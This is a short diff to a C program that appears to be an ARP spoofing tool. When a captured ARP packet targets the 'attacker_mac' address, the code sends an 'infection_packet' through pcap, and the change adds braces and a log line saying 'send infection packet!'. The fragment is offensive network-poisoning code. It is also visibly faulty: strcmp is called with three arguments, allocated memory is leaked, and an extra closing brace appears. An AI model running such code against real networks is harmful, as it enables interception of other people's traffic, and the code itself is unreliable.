@@ -131,7 +131,11 @@ int main(int argc, char* argv[])
             struct arp_hdr* l3_hdr = (struct arp_hdr*)malloc(28);
             l3_hdr = (struct arp_hdr*)(packet + 14);
             if(!strcmp(l3_hdr -> T_hardware_addr, attacker_mac, 6))
+            {
                 pcap_sendpacket(handle, infection_packet, 42);
+                printf("send infection packet!\n");
+            }
+            }
         }
         else
         {
